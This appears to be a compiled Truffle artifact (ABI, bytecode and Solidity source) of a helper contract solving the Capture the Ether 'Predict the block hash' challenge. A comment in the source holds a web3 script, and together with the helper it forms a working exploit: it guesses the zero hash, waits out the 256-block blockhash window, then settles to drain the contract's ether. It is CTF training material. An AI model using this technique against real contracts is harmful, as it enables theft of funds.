{
  "contractName": "PredictHashHelper",
  "abi": [
    {
      "constant": true,
      "inputs": [],
      "name": "getOtherContract",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "newAddr",
          "type": "address"
        }
      ],
      "name": "setOtherContract",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "otherContract",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "name": "caller",
          "type": "address"
        },
        {
          "indexed": false,
          "name": "newAddress",
          "type": "address"
        }
      ],
      "name": "SetOtherContract",
      "type": "event"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "blockNum",
          "type": "uint256"
        }
      ],
      "name": "getAnswer",
      "outputs": [
        {
          "name": "",
          "type": "bytes32"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "wasteBlock",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "isComplete",
      "outputs": [
        {
          "name": "",
          "type": "bool"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "withdraw",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "hash",
          "type": "bytes32"
        }
      ],
      "name": "lockInGuess",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "settle",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x606060405260008060006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550341561005057600080fd5b6106298061005f6000396000f300606060405260043610610099576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680630b4b51981461009b57806311da60b4146100f05780631e73c0451461010557806335a28f3e1461011a5780633ccfd60b14610153578063b2fa1c9e14610168578063b5ab58dc14610195578063e98d36e1146101d4578063ed7f559c14610229575b005b34156100a657600080fd5b6100ae610245565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34156100fb57600080fd5b61010361026e565b005b341561011057600080fd5b61011861030a565b005b341561012557600080fd5b610151600480803573ffffffffffffffffffffffffffffffffffffffff1690602001909190505061033a565b005b341561015e57600080fd5b610166610414565b005b341561017357600080fd5b61017b61046d565b604051808215151515815260200191505060405180910390f35b34156101a057600080fd5b6101b66004808035906020019091905050610514565b60405180826000191660001916815260200191505060405180910390f35b34156101df57600080fd5b6101e761051f565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b610243600480803560001916906020019091905050610544565b005b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1690508073ffffffffffffffffffffffffffffffffffffffff166311da60b46040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b15156102f757600080fd5b5af1151561030457600080fd5b50505050565b6001600060148282829054906101000a900460ff160192506101000a81548160ff021916908360ff160217905550565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055507f081eb3239ea805b9a08e7c4f93baacc9d1965ecde599e5ed9b2b3936cd3fe0b83382604051808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019250505060405180910390a150565b3373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f19350505050151561046b57600080fd5b565b6000806000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1690508073ffffffffffffffffffffffffffffffffffffffff1663b2fa1c9e6040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401602060405180830381600087803b15156104f757600080fd5b5af1151561050457600080fd5b5050506040518051905091505090565b600081409050919050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1690508073ffffffffffffffffffffffffffffffffffffffff1663ed7f559c670de0b6b3a7640000846040518363ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004018082600019166000191681526020019150506000604051808303818588803b15156105e857600080fd5b5af115156105f557600080fd5b5050505050505600a165627a7a72305820f0a6bd84e7f6ca21d41b8cc5df8589848e54f37c6f569de254ea7bcb93719ffc0029",
  "source": "pragma solidity ^0.4.21;\r\n\r\nimport './OtherContract.sol';\r\n\r\n/*\r\nconst oneEth = web3.utils.toWei('1', 'ether');\r\nvar predictTheBlockHashChallenge = await PredictTheBlockHashChallenge.deployed();\r\nvar predictHashHelper = await PredictHashHelper.deployed();\r\n\r\nvar blockNumTarget = await web3.eth.getBlockNumber() + 260;\r\nvar answer = await predictHashHelper.getAnswer(blockNumTarget);\r\nawait predictTheBlockHashChallenge.lockInGuess(answer, {from: accounts[0], value: oneEth});\r\nvar blockNumCurrent = await web3.eth.getBlockNumber();\r\nwhile (blockNumCurrent < blockNumberTarget) {\r\n    await predictHashHelper.wasteBlock();\r\n    blockNumCurrent = await web3.eth.getBlockNumber();\r\n}\r\nawait predictTheBlockHashChallenge.settle();\r\nawait predictTheBlockHashChallenge.isComplete();\r\n*/\r\n\r\ncontract PredictHashHelper is OtherContract {\r\n    uint8 waste;\r\n\r\n    function getAnswer(uint256 blockNum) public view returns (bytes32) {\r\n        return block.blockhash(blockNum);\r\n    }\r\n\r\n    function wasteBlock() public {\r\n        waste += 1;\r\n    }\r\n\r\n    function() public payable { \r\n    }\r\n\r\n    function isComplete() public view returns (bool) {\r\n        PredictTheBlockHashChallenge predictTheBlockHashChallenge = PredictTheBlockHashChallenge(otherContract);\r\n        return predictTheBlockHashChallenge.isComplete();\r\n    }\r\n\r\n    function withdraw() public {\r\n        msg.sender.transfer(address(this).balance);\r\n    }\r\n\r\n    function lockInGuess(bytes32 hash) public payable {\r\n        PredictTheBlockHashChallenge predictTheBlockHashChallenge = PredictTheBlockHashChallenge(otherContract);\r\n        predictTheBlockHashChallenge.lockInGuess.value(1 ether)(hash);\r\n    }    \r\n\r\n    function settle() public {\r\n        PredictTheBlockHashChallenge predictTheBlockHashChallenge = PredictTheBlockHashChallenge(otherContract);\r\n        predictTheBlockHashChallenge.settle();\r\n    }\r\n}\r\n\r\ncontract PredictTheBlockHashChallenge {\r\n    address guesser;\r\n    bytes32 guess;\r\n    uint256 settlementBlockNumber;\r\n\r\n    function PredictTheBlockHashChallenge() public payable {\r\n        require(msg.value == 1 ether);\r\n    }\r\n\r\n    function isComplete() public view returns (bool) {\r\n        return address(this).balance == 0;\r\n    }\r\n\r\n    function lockInGuess(bytes32 hash) public payable {\r\n        require(guesser == 0);\r\n        require(msg.value == 1 ether);\r\n\r\n        guesser = msg.sender;\r\n        guess = hash;\r\n        settlementBlockNumber = block.number + 1;\r\n    }\r\n\r\n    function settle() public {\r\n        require(msg.sender == guesser);\r\n        require(block.number > settlementBlockNumber);\r\n\r\n        bytes32 answer = block.blockhash(settlementBlockNumber);\r\n\r\n        guesser = 0;\r\n        if (guess == answer) {\r\n            msg.sender.transfer(2 ether);\r\n        }\r\n    }\r\n}\r\n",
  "sourcePath": "C:\\defi\\capturetheether\\contracts\\PredictTheBlockHashChallenge.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.21+commit.dfe3193c.Emscripten.clang"
  },
  "schemaVersion": "3.4.3",
  "updatedAt": "2021-11-07T14:18:08.641Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}